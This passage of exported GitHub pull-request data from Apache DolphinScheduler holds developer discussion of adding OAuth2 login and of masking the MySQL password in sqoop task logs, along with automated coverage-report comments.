[...cheduler/plugin/alert/dingtalk/DingTalkSender.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1kaW5ndGFsay9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZGluZ3RhbGsvRGluZ1RhbGtTZW5kZXIuamF2YQ==) | `34.91% <0.00%> (ø)` | |\n| [...r/plugin/alert/email/EmailAlertChannelFactory.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1lbWFpbC9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZW1haWwvRW1haWxBbGVydENoYW5uZWxGYWN0b3J5LmphdmE=) | `98.82% <ø> (ø)` | |\n| [...olphinscheduler/plugin/alert/email/ExcelUtils.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1lbWFpbC9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZW1haWwvRXhjZWxVdGlscy5qYXZh) | `81.63% <ø> (ø)` | |\n| [...olphinscheduler/plugin/alert/email/MailSender.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1lbWFpbC9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZW1haWwvTWFpbFNlbmRlci5qYXZh) | `50.68% <ø> (ø)` | |\n| [...ugin/alert/email/template/DefaultHTMLTemplate.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1lbWFpbC9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZW1haWwvdGVtcGxhdGUvRGVmYXVsdEhUTUxUZW1wbGF0ZS5qYXZh) | `79.24% <ø> (ø)` | |\n| [...plugin/alert/feishu/FeiShuAlertChannelFactory.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1mZWlzaHUvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL2FsZXJ0L2ZlaXNodS9GZWlTaHVBbGVydENoYW5uZWxGYWN0b3J5LmphdmE=) | `97.36% <ø> (ø)` | |\n| [...dolphinscheduler/plugin/alert/http/HttpSender.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1odHRwL3NyYy9tYWluL2phdmEvb3JnL2FwYWNoZS9kb2xwaGluc2NoZWR1bGVyL3BsdWdpbi9hbGVydC9odHRwL0h0dHBTZW5kZXIuamF2YQ==) | `47.69% <ø> (ø)` | |\n| [...eduler/plugin/alert/pagerduty/PagerDutySender.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1wYWdlcmR1dHkvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL2FsZXJ0L3BhZ2VyZHV0eS9QYWdlckR1dHlTZW5kZXIuamF2YQ==) | `66.07% <ø> (ø)` | |\n| [...eduler/plugin/alert/script/ScriptAlertChannel.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1zY3JpcHQvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL2FsZXJ0L3NjcmlwdC9TY3JpcHRBbGVydENoYW5uZWwuamF2YQ==) | `16.66% <0.00%> (ø)` | |\n| ... and [231 more](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) | |\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)\n",
                        "user": "codecov-commenter",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-10-27T07:00:37Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1293080788"
                    },
                    {
                        "body": "> Hello, I'm trying to add a new authenticator for DS to support OAuth2.0. Currently I'm blocked by some kind of cookie missing issue. After calling `http://localhost:12345/dolphinscheduler/testlogin/google`, I get successfully redirected to google login page and completedthe OAuth process. I could see the `sessionId` in browser. ![image](https://user-images.githubusercontent.com/34905992/198209678-92d3422e-9a13-45db-a21f-df39aebc421b.png) However, if I try to visit `http://localhost:12345/dolphinscheduler/ui/projects`, the `sessionId` is missing and I get blocked by `LoginHandlerInterceptor`. I'm wondering whether it is caused by the wrong path or some other stuff related to cookie since I haven't implemented the front-end part of `/testlogin/google`\r\n> \r\n> So I have two questions:\r\n> \r\n> 1. Am I supposed to handle the cookie path in front-end part so that the cookie added by back-end could be sent to /ui/**?\r\n> 2. Since Spring Boot has its default interceptor for OAuth2.0, should I disabled `ds LoginHandlerInterceptor` when using OAuth2.0?\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-ui/src/views/login/index.tsx#L35-L52\r\n> \r\n> Related information:\r\n> \r\n> After authentication, ds will put `sessionId` into cookies and check the `sessionId` in `preHandle` method of `LoginHandlerInterceptor`, as shown below:\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/security/impl/AbstractAuthenticator.java#L82-L100\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/interceptor/LoginHandlerInterceptor.java#L69-L74\r\n> \r\n> As we could see in `LoginController`, the url for login is `/login` and will be mapped to `/ui/login`\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/controller/LoginController.java#L83\r\n> \r\n> But in my test code, I added a new url for login which is `/testlogin/google` without front-end. And it could not be mapped to `/ui/testlogin/google`. ![image](https://user-images.githubusercontent.com/34905992/198208457-7799366c-3b62-41ac-8f5b-a91e60d4c8b1.png)\r\n> \r\n> @kezhenxu94 @devosend Could u plz help take a look when available? Thanks!\r\n\r\nProblems solved, thanks for the help : ) ",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-10-27T13:17:51Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1293514424"
                    },
                    {
                        "body": "@songjianet @devosend @Amy0104 Currently we have some logic in front-end `handleLogin` like calling `getUserInfo()`. Once we support `OAuth2` login, user will no more get redirected to Username / Password login page, this `handlLogin` will not get triggered and that causes some issues, such as users cannot create projects. May I ask whether there are solutions to this? \r\n\r\n![image](https://user-images.githubusercontent.com/34905992/199916898-f26594f6-798d-469c-a2bb-b7a58b0425b0.png)\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/7d0e2cbbb9fcd2e1543f5166f0518eda03afae89/dolphinscheduler-ui/src/views/login/use-login.ts#L35-L44",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-04T07:28:39Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1303068538"
                    },
                    {
                        "body": "> @songjianet @devosend @Amy0104 Currently we have some logic in front-end `handleLogin` like calling `getUserInfo()`. Once we support `OAuth2` login, user will no more get redirected to Username / Password login page, this `handlLogin` will not get triggered and that causes some issues, such as users cannot create projects. May I ask whether there are solutions to this?\r\n> \r\n> ![image](https://user-images.githubusercontent.com/34905992/199916898-f26594f6-798d-469c-a2bb-b7a58b0425b0.png)\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/7d0e2cbbb9fcd2e1543f5166f0518eda03afae89/dolphinscheduler-ui/src/views/login/use-login.ts#L35-L44\r\n\r\n\r\n\r\n> @songjianet @devosend @Amy0104 Currently we have some logic in front-end `handleLogin` like calling `getUserInfo()`. Once we support `OAuth2` login, user will no more get redirected to Username / Password login page, this `handlLogin` will not get triggered and that causes some issues, such as users cannot create projects. May I ask whether there are solutions to this?\r\n> \r\n> ![image](https://user-images.githubusercontent.com/34905992/199916898-f26594f6-798d-469c-a2bb-b7a58b0425b0.png)\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/7d0e2cbbb9fcd2e1543f5166f0518eda03afae89/dolphinscheduler-ui/src/views/login/use-login.ts#L35-L44\r\n\r\nYou can add a new blank page on the front end to call `getUserInfo`.",
                        "user": "devosend",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-08T02:54:44Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1306551902"
                    },
                    {
                        "body": "@Abingcbc Since the credentials differentiate a lot from LDAP / PASSWORD when integrated with OAuth2.0, we may abstract `AbstractLoginCredentials` to keep things unified like the way in this draft PR. WDYT?",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-30T07:31:05Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1331746749"
                    },
                    {
                        "body": "Considering @Abingcbc has been working on integrating DS with `OAuth2.0` since March 5th, I think a better choice is to follow up with #8706 and help it get merged. Therefore, I'm closing this PR temporarily. If there are more things to do after #8706 merged, I will reopen this PR. Thanks : )",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-30T07:36:13Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1331750701"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/apache/dolphinscheduler/pulls/12549",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/pull/11589",
                "title": "[Feature-10498] Mask the password in the log of sqoop task",
                "labels": [
                    "improvement",
                    "backend",
                    "document",
                    "security",
                    "3.2.0"
                ],
                "user": "rickchengx",
                "issue_author_association": "CONTRIBUTOR",
                "number": 11589,
                "id": 1345948356,
                "state": "closed",
                "project_created_at": "2022-08-22T07:28:36Z",
                "closed_at": "2022-11-24T06:54:54Z",
                "body": "<!--Thanks very much for contributing to Apache DolphinScheduler. Please review https://dolphinscheduler.apache.org/en-us/community/development/pull-request.html before opening a pull request.-->\r\n\r\n\r\n## Purpose of the pull request\r\n\r\nMask the password in the log of `sqoop` task.\r\n\r\nCurrently, there are 2 positions that the log of `sqoop` task will output the password of mysql:\r\nhttps://github.com/apache/dolphinscheduler/blob/17a9dd25fa0e80b048394f79db130f56eb8ef72f/dolphinscheduler-task-plugin/dolphinscheduler-task-sqoop/src/main/java/org/apache/dolphinscheduler/plugin/task/sqoop/SqoopTask.java#L83\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/17a9dd25fa0e80b048394f79db130f56eb8ef72f/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/ShellCommandExecutor.java#L116\r\n\r\n\r\n## Brief change log\r\n\r\n<!--*(for example:)*\r\n  - *Add maven-checkstyle-plugin to root pom.xml*\r\n-->\r\n## Verify this pull request\r\n\r\n<!--*(Please pick either of the following options)*-->\r\n\r\nManually tested.\r\n\r\n<img width=\"1122\" alt=\"截屏2022-08-22 15 30 38\" src=\"https://user-images.githubusercontent.com/38122586/185864886-c8e827dd-d7e0-461b-9565-59c7bcbc8dcf.png\">\r\n",
                "comments": [
                    {
                        "body": "related: #10498",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-08-22T08:29:48Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1222025724"
                    },
                    {
                        "body": "This is a good feature. Could you please add a UT for it? Thanks.",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-08-24T11:24:22Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1225587341"
                    },
                    {
                        "body": "> This is a good feature. Could you please add a UT for it? Thanks.\r\n\r\nHi, @EricGao888, Sorry for the late response. I've added a UT.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-08-31T10:16:19Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1232746946"
                    },
                    {
                        "body": "# [Codecov](https://codecov.io/gh/apache/dolphinscheduler/pull/11589?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) Report\n> Merging [#11589](https://codecov.io/gh/apache/dolphinscheduler/pull/11589?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (6708c75) into [dev](https://codecov.io/gh/apache/dolphinscheduler/commit/64a29c61e47442dbca84ee4bfca9815fd546a26f?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (64a29c6) will **increase** coverage by `0.00%`.\n> The diff coverage is `44.44%`.\n\n```diff\n@@            Coverage Diff            @@\n##                dev   #11589   +/-   ##\n=========================================\n  Coverage     39.35%   39.36%           \n  Complexity     4270     4270           \n=========================================\n  Files          1067     1067           \n  Lines         40118    40121    +3     \n  Branches       4606     4605    -1     \n=========================================\n+ Hits          15790    15794    +4     \n+ Misses        22552    22547    -5     \n- Partials       1776     1780    +4     \n```\n\n\n| [Impacted Files](https://codecov.io/gh/apache/dolphinscheduler/pull/11589?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) | Coverage Δ | |\n|---|---|---|\n| [.../dolphinscheduler/plugin/task/sqoop/SqoopTask.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci10YXNrLXBsdWdpbi9kb2xwaGluc2NoZWR1bGVyLXRhc2stc3Fvb3Avc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL3Rhc2svc3Fvb3AvU3Fvb3BUYXNrLmphdmE=) | `0.00% <0.00%> (ø)` | |\n| [...inscheduler/common/log/SensitiveDataConverter.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1jb21tb24vc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvY29tbW9uL2xvZy9TZW5zaXRpdmVEYXRhQ29udmVydGVyLmphdmE=) | `63.15% <50.00%> (ø)` | |\n| [...erver/master/processor/queue/TaskEventService.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1tYXN0ZXIvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvc2VydmVyL21hc3Rlci9wcm9jZXNzb3IvcXVldWUvVGFza0V2ZW50U2VydmljZS5qYXZh) | `69.64% <0.00%> (-10.72%)` | :arrow_down: |\n| [...dolphinscheduler/remote/future/ResponseFuture.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1yZW1vdGUvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcmVtb3RlL2Z1dHVyZS9SZXNwb25zZUZ1dHVyZS5qYXZh) | `81.96% <0.00%> (-1.64%)` | :arrow_down: |\n| [...r/plugin/registry/zookeeper/ZookeeperRegistry.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1yZWdpc3RyeS9kb2xwaGluc2NoZWR1bGVyLXJlZ2lzdHJ5LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1yZWdpc3RyeS16b29rZWVwZXIvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL3JlZ2lzdHJ5L3pvb2tlZXBlci9ab29rZWVwZXJSZWdpc3RyeS5qYXZh) | `50.00% <0.00%> (+6.45%)` | :arrow_up: |\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)\n",
                        "user": "codecov-commenter",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-09-01T02:39:25Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1233666175"
                    },
                    {
                        "body": "> May I ask whether we could do this with some other ways in `sqoop task plugin` instead of add a specific condition here for `sqoop`? ShellCommandExecutor is shared across different task plugins, it might not be a good practice and uneasy to maintain if we need to change it every time we need to mask something for a task plugin. The same for line 55-56.\r\n\r\nHi, @EricGao888. Thanks for your suggestions. I have moved the masking logic to a common util class.\r\n\r\n### Background\r\n\r\nThere are 2 possible locations that the log may contain the sensitive data (e.g., password). Taking the sqoop task as an example:\r\n\r\n1. The log output in the `buildCommand()` in `SqoopTask`. \r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/28469fc9b23094a74cbef83b9990d6fbced20d79/dolphinscheduler-task-plugin/dolphinscheduler-task-sqoop/src/main/java/org/apache/dolphinscheduler/plugin/task/sqoop/SqoopTask.java#L82-L84\r\n\r\n2. The log output in the `createCommandFileIfNotExists(String execCommand, String commandFile)` in `ShellCommandExecutor`. We need to mask the sensitive data of `execCommand` here since the `execCommand` will be output in the log. But this class is shared by multiple task plugins and how to mask the sensitive data needs to be discussed.\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/17a9dd25fa0e80b048394f79db130f56eb8ef72f/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/ShellCommandExecutor.java#L115-L116\r\n\r\n\r\n\r\nAs for me, there are 2 ways:\r\n\r\n### **1. Mask the sensitive data at the point of outputting the task log and every task plugin applys the same masking logic**\r\n\r\n* Encapsulate the `logger` of `AbstractTaskExecutor`. Every time the task log is output, the output statement will be matched to see if there is any sensitive data.\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/ebcffb04aad9db8ec6df1105e4770b187088e701/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/AbstractTaskExecutor.java#L37\r\n\r\n* By default, common sensitive data will be matched, and users can customize the sensitive information that needs to be masked.\r\n\r\n<img width=\"619\" alt=\"image\" src=\"https://user-images.githubusercontent.com/38122586/188794873-0196158f-ebfc-4398-835a-f2ecca19cfef.png\">\r\n\r\n![image](https://user-images.githubusercontent.com/38122586/188795058-f19fb1fc-587d-404c-b7e3-c93ed7c14228.png)\r\n\r\nNote that the command after masking will only used to output in the log, so this method **will not affect the actual command executed.**\r\n\r\n\r\nReference: [Sensitive data masking of Airflow](https://airflow.apache.org/docs/apache-airflow/stable/security/secrets/mask-sensitive-values.html)\r\n\r\n\r\n\r\n### **2. Each task plugin implements its own masking logic**\r\n\r\nRefactor the `createCommandFileIfNotExists()` and add a param `String execCommandMasking`.\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/28469fc9b23094a74cbef83b9990d6fbced20d79/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/ShellCommandExecutor.java#L84-L87\r\n\r\nAlso `AbstractCommandExecutor.run(execCommand)` needs to be refactored to `AbstractCommandExecutor.run(execCommand, execCommandMasking)`.\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/28469fc9b23094a74cbef83b9990d6fbced20d79/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/AbstractCommandExecutor.java#L176\r\n\r\nBy doing this, the process logic of how to mask the sensitive data can be done in each task plugin. But this will modify `AbstractCommandExecutor` and `ShellCommandExecutor`, and many task plugins need to be modified and implement their own masking logic.\r\n\r\nBelow is the list of affected classes:\r\n\r\n<img width=\"365\" alt=\"image\" src=\"https://user-images.githubusercontent.com/38122586/188796830-43a25252-f2b9-498d-9407-9712a9317ae6.png\">\r\n\r\n\r\n### Conclusion\r\nI personally prefer the first way to mask the sensitive data. And I also sent a related discussion email to the mailing list.\r\n\r\nSo which way do you think is better? Or there are other better ways to do so.\r\nAny comments or suggestions are welcome!\r\n",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-05T07:25:03Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1236633109"
                    },
                    {
                        "body": "We have use `SensitiveDataConverter` for the whole log to hide the password.",
                        "user": "ruanwenjun",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-09-07T12:44:47Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1239342287"
                    },
                    {
                        "body": "> We have use `SensitiveDataConverter` for the whole log to hide the password.\r\n\r\nThanks for your suggestion! I'll look into it.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-08T03:24:10Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1240170876"
                    },
                    {
                        "body": "> We have use `SensitiveDataConverter` for the whole log to hide the password.\r\n\r\nHi, @ruanwenjun , It seems that there is a bug in `SensitiveDataConverter` which will be fixed in #11459 \r\n\r\nAfter #11459 is fixed, maybe we can add a pattern in `SensitiveDataConverter` to mask the password in `sqoop` task.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-13T10:04:51Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1245186719"
                    },
                    {
                        "body": "Hi, @ruanwenjun , @EricGao888 , I've made changes to my PR as below:\r\n\r\n1. Use `SensitiveDataConverter` to uniformly mask sensitive information in task logs.\r\n2. Each task plugin can add its own regular match expressions to `SensitiveDataConverter` through `addMaskPattern()`. E.g., `Sqoop` task adds its own regular expression in `init()`:\r\n\r\n```\r\nSensitiveDataConverter.addMaskPattern(SqoopConstants.SQOOP_PASSWORD_REGEX);\r\n```\r\n\r\nThis PR solves the problem of the mysql password in the sqoop task log. If others find that other task types will output sensitive information in the log, they only need to add their own regular expression through `addMaskPattern()` in the `init()` of the task plugin.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-19T10:06:52Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1250820539"
                    },
                    {
                        "body": " \r\n> 1. Use `SensitiveDataConverter` to uniformly mask sensitive information in task logs.\r\n> 2. Each task plugin can add its own regular match expressions to `SensitiveDataConverter` through `addMaskPattern()`. E.g., `Sqoop` task adds its own regular expression in `init()`:\r\n> \r\n> ```\r\n> SensitiveDataConverter.addMaskPattern(SqoopConstants.SQOOP_PASSWORD_REGEX);\r\n> ```\r\n> \r\n> This PR solves the problem of the mysql password in the sqoop task log. If others find that other task types will output sensitive information in the log, they only need to add their own regular expression through `addMaskPattern()` in the `init()` of the task plugin.\r\n\r\nHi, @ruanwenjun , could you please help review this? I've rebased to remove conflicts.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-10-13T07:45:32Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1277175211"
                    },
                    {
                        "body": "> Hi, @ruanwenjun , @EricGao888 , I've made changes to my PR as below:\r\n> \r\n> 1. Use `SensitiveDataConverter` to uniformly mask sensitive information in task logs.\r\n> 2. Each task plugin can add its own regular match expressions to `SensitiveDataConverter` through `addMaskPattern()`. E.g., `Sqoop` task adds its own regular expression in `init()`:\r\n> \r\n> ```\r\n> SensitiveDataConverter.addMaskPattern(SqoopConstants.SQOOP_PASSWORD_REGEX);\r\n> ```\r\n> \r\n> This PR solves the problem of the mysql password in the sqoop task log. If others find that other task types will output sensitive information in the log, they only need to add their own regular expression through `addMaskPattern()` in the `init()` of the task plugin.\r\n\r\nHi, @EricGao888 @caishunfeng , could you please help review this?",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-07T03:52:28Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1305044637"
                    },
                    {
                        "body": "SonarCloud Quality Gate failed.&nbsp; &nbsp; [![Quality Gate failed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/failed-16px.png 'Quality Gate failed')](https://sonarcloud.io/dashboard?id=apache-dolphinscheduler&pullRequest=11589)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=VULNERABILITY)  \n[![Security 